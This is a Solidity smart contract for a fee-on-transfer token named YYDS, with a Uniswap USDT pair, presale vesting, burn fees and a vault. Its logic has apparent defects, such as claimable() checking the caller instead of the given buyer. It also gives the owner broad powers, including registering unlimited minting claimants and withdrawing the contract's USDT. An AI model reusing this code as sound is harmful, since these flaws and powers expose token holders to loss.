// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "./ERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";
import "./SafeERC20.sol";

import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract YYDS is ERC20, Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    bool private swapping;
    bool public onpresale;
    uint256 public startTime;
    bool public zeroVaultPeriod = false;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public usdtAddr;

    uint256 public MAX_SUPPLY = 21440000 * 10**18;

    uint256 public VAULT_SUPPLY = 1000000 * 10**18;
    uint256 public PRESALE_SUPPLY = 11440000 * 10**18;
    uint256 public LP_SUPPLY = 1000000 * 10**18;
    uint256 public TREASURY = 8000000 * 10**18;

    uint256 public constant LIMIT_AMOUNT = 10000 * 10**18;
    uint256 public constant swapTokensAtAmount = 1500 * 10**18;

    uint256 public constant presalePrice = 33 * 10**18;

    uint256 private constant ONE_DAY = 1 days;
    uint256 private constant THREE_DAYS = 3 days;
    uint256 private constant ONE_YEAR = 365 days;
    uint256 private constant THREE_MONTHS = 90 days;

    address public vaultWallet;
    address public lpRewardsWallet;
    address public rewardsWallet;
    address public marketingWallet;
    address public supportRewardWallet;

    uint256 public burnFee = 10;

    uint256 public rewardsFee = 10;
    uint256 public liquidityFee = 20;
    uint256 public marketingFee = 20;
    uint256 public totalFees = 50;

    uint256 public totalBurnedToken;
    uint256 public distributedToken;
    uint256 public stabilizeToken;
    uint256 public currentFeeTokens;

    mapping(address => uint256) claimedtoken;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public automatedMarketMakerPairs;
    mapping(address => uint256) public buyedTokens;

    mapping(address => bool) public registerState;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event DistributeToken(
        address indexed wallet,
        uint256 amount,
        uint256 timestamp
    );

    constructor(
        address router_,
        address usdtAddr_,
        address[5] memory wallets
    ) payable ERC20("YYDS", "YYDS") {
        vaultWallet = wallets[0];
        lpRewardsWallet = wallets[1];
        rewardsWallet = wallets[2];
        marketingWallet = wallets[3];
        supportRewardWallet = wallets[4];

        usdtAddr = usdtAddr_;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router_);

        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), usdtAddr);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(vaultWallet, true);
        excludeFromFees(lpRewardsWallet, true);
        excludeFromFees(rewardsWallet, true);
        excludeFromFees(marketingWallet, true);
        excludeFromFees(supportRewardWallet, true);

        _mint(address(this), MAX_SUPPLY);
        _burn(address(this), TREASURY);
        _mint(marketingWallet, TREASURY);
        _burn(address(this), PRESALE_SUPPLY);

        onpresale = true;
        registerState[address(0)] = true;
    }

    function burnVault(uint256 _amount) external onlyOwner {
        _burn(address(this), _amount);
        VAULT_SUPPLY -= _amount;
    }

    function registor(address buyer) internal {
        require(onpresale == true, "presale finished");
        registerState[buyer] = true;
    }

    function regOne(address buyer) external onlyOwner {
        registor(buyer);
    }

    function regBatch(address[] memory addresses) external onlyOwner {
        for (uint256 i = 0; i < addresses.length; i++) {
            registor(addresses[i]);
        }
    }

    function claim() external {
        require(registerState[msg.sender] == true, "only for presale buyer");
        uint256 duration = block.timestamp.sub(startTime);
        require(startTime > 0 && duration > THREE_DAYS, "not claimable yet");
        uint256 realduration = duration - THREE_DAYS;
        uint256 fullduration = 7 weeks;
        if (realduration <= fullduration) {
            uint256 claimabletoken = 3000 *
                10**18 +
                (realduration * 7000 * 10**18) /
                fullduration -
                claimedtoken[msg.sender];
            _mint(msg.sender, claimabletoken);
            claimedtoken[msg.sender] += claimabletoken;
        } else {
            uint256 claimabletoken = 10000 * 10**18 - claimedtoken[msg.sender];
            _mint(msg.sender, claimabletoken);
            claimedtoken[msg.sender] += claimabletoken;
        }
    }

    function claimable(address _buyer) public view returns (uint256) {
        if (registerState[msg.sender] == false) {
            return 0;
        }
        uint256 duration = block.timestamp.sub(startTime);
        require(startTime > 0 && duration > THREE_DAYS, "not claimable yet");
        uint256 realduration = duration - THREE_DAYS;
        uint256 fullduration = 7 weeks;
        if (realduration <= fullduration) {
            uint256 claimabletoken = 3000 *
                10**18 +
                (realduration * 7000 * 10**18) /
                fullduration -
                claimedtoken[_buyer];
            return claimabletoken;
        } else {
            uint256 claimabletoken = 10000 * 10**18 - claimedtoken[_buyer];
            return claimabletoken;
        }
    }

    receive() external payable {}

    function addInitLiquidity() external payable onlyOwner {
        require(startTime == 0, "only once");
        startTime = block.timestamp;

        uint256 amountUSDT = 3333 * 10**18;
        uint256 amountYYDS = LP_SUPPLY;

        _approve(address(this), address(uniswapV2Router), LP_SUPPLY);
        IERC20(usdtAddr).approve(address(uniswapV2Router), amountUSDT);

        LP_SUPPLY = amountYYDS;

        _burn(address(this), LP_SUPPLY - amountYYDS);

        onpresale = false;

        uniswapV2Router.addLiquidity(
            address(this),
            usdtAddr,
            amountYYDS,
            amountUSDT,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function removeLiquidity() external onlyOwner {
        uint256 duration = block.timestamp.sub(startTime);
        require(duration > THREE_MONTHS, "Lock for 3 months");

        uint256 _liquidity = IUniswapV2Pair(uniswapV2Pair).balanceOf(
            address(this)
        );
        IUniswapV2Pair(uniswapV2Pair).approve(
            address(uniswapV2Router),
            _liquidity
        );
        uniswapV2Router.removeLiquidity(
            address(this),
            usdtAddr,
            _liquidity,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function rescue() external onlyOwner {
        uint256 _amount = IERC20(usdtAddr).balanceOf(address(this));
        IERC20(usdtAddr).transfer(owner(), _amount);
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
        totalBurnedToken = totalBurnedToken.add(amount);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(
            _isExcludedFromFees[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeMultipleAccountsFromFees(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }

        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The PancakeSwap pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(
            automatedMarketMakerPairs[pair] != value,
            "Automated market maker pair is already set to that value"
        );
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function distributeToken() external {
        require(totalBurnedToken > 400 * 10**22, "Less than 4 million");
        require(!zeroVaultPeriod, "Vault is zero");

        uint256 duration = block.timestamp.sub(startTime);
        require(duration > THREE_DAYS, "Not distributed period");
        uint256 remainder = VAULT_SUPPLY.sub(distributedToken);

        if (duration > ONE_YEAR) {
            super._burn(address(this), remainder);
            totalBurnedToken = totalBurnedToken.add(remainder);
            zeroVaultPeriod = true;
        } else {
            uint256 amount = totalBurnedToken
                .sub(LP_SUPPLY - stabilizeToken)
                .sub(distributedToken);
            if (amount > 0) {
                distributedToken = distributedToken.add(amount);
                if (distributedToken >= VAULT_SUPPLY) {
                    distributedToken = VAULT_SUPPLY;
                    zeroVaultPeriod = true;
                }

                uint256 burnAmount = amount.mul(15).div(100);
                totalBurnedToken = totalBurnedToken.add(burnAmount);
                super._burn(address(this), burnAmount);

                amount = amount.sub(burnAmount);
                if (amount > remainder) {
                    amount = remainder;
                }
                super._transfer(address(this), vaultWallet, amount);
                emit DistributeToken(vaultWallet, amount, block.timestamp);
            }
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        bool canSwap = currentFeeTokens > swapTokensAtAmount;

        if (
            canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from]
        ) {
            swapping = true;

            swapAndSendToWalletsFee(currentFeeTokens);
            currentFeeTokens = 0;

            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if (takeFee) {
            if (
                automatedMarketMakerPairs[from] || automatedMarketMakerPairs[to]
            ) {
                swapTokenAndFees(from, to, amount);
            } else if (!zeroVaultPeriod) {
                transferTokenAndFees(from, to, amount);
            } else {
                super._transfer(from, to, amount);
            }
        } else {
            super._transfer(from, to, amount);
        }
    }

    function swapTokenAndFees(
        address from,
        address to,
        uint256 amount
    ) internal {
        uint256 burnAmount = 0;
        uint256 duration = block.timestamp.sub(startTime);

        if (duration < ONE_DAY) {
            if (automatedMarketMakerPairs[from]) {
                burnAmount = amount.mul(50).div(100);
                amount = amount.sub(burnAmount);
                buyedTokens[to] = buyedTokens[to].add(amount);
                require(buyedTokens[to] <= LIMIT_AMOUNT, "exceeds limit");
            } else if (automatedMarketMakerPairs[to]) {
                burnAmount = amount.mul(6).div(100);
                amount = amount.sub(burnAmount);
            }
        } else if (duration < THREE_DAYS) {
            burnAmount = amount.mul(6).div(100);
            amount = amount.sub(burnAmount);
            if (automatedMarketMakerPairs[from]) {
                buyedTokens[to] = buyedTokens[to].add(amount);
                require(buyedTokens[to] <= LIMIT_AMOUNT, "exceeds limit");
            }
        } else {
            if (stabilizeToken == 0) {
                if (totalBurnedToken < 400 * 10**22) {
                    stabilizeToken = 200 * 10**22;
                } else {
                    stabilizeToken = LP_SUPPLY.sub(totalBurnedToken);
                }
            }

            if (zeroVaultPeriod) {
                burnAmount = amount.mul(2).div(1000);
                uint256 fees = amount.mul(18).div(1000);
                amount = amount.sub(burnAmount).sub(fees);
                super._transfer(from, supportRewardWallet, fees);
            } else if (totalBurnedToken < 400 * 10**22) {
                burnAmount = amount.mul(6).div(100);
                amount = amount.sub(burnAmount);
            } else {
                burnAmount = amount.mul(burnFee).div(1000);
                uint256 fees = amount.mul(totalFees).div(1000);
                currentFeeTokens = currentFeeTokens.add(fees);
                amount = amount.sub(burnAmount).sub(fees);
                super._transfer(from, address(this), fees);
            }
        }

        super._burn(from, burnAmount);
        super._transfer(from, to, amount);
        totalBurnedToken = totalBurnedToken.add(burnAmount);
    }

    function transferTokenAndFees(
        address from,
        address to,
        uint256 amount
    ) internal {
        uint256 burnAmount = amount.mul(10).div(100);
        amount = amount.sub(burnAmount);

        super._burn(from, burnAmount);
        super._transfer(from, to, amount);
        totalBurnedToken = totalBurnedToken.add(burnAmount);
    }

    function swapAndSendToWalletsFee(uint256 tokenAmount) private {
        uint256 lpRewardsTokens = tokenAmount.mul(liquidityFee).div(totalFees);
        swapTokensForUSDT(lpRewardsTokens, lpRewardsWallet);

        uint256 marketingTokens = tokenAmount.mul(marketingFee).div(totalFees);
        swapTokensForUSDT(marketingTokens, marketingWallet);

        uint256 rewardsTokens = tokenAmount.mul(rewardsFee).div(totalFees);
        swapTokensForUSDT(rewardsTokens, rewardsWallet);
    }

    function swapTokensForUSDT(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdtAddr;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            to,
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 usdtAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        IERC20(usdtAddr).approve(address(uniswapV2Router), usdtAmount);

        uniswapV2Router.addLiquidity(
            address(this),
            usdtAddr,
            tokenAmount,
            usdtAmount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function getBlockTime() external view returns (uint256) {
        return block.timestamp;
    }
}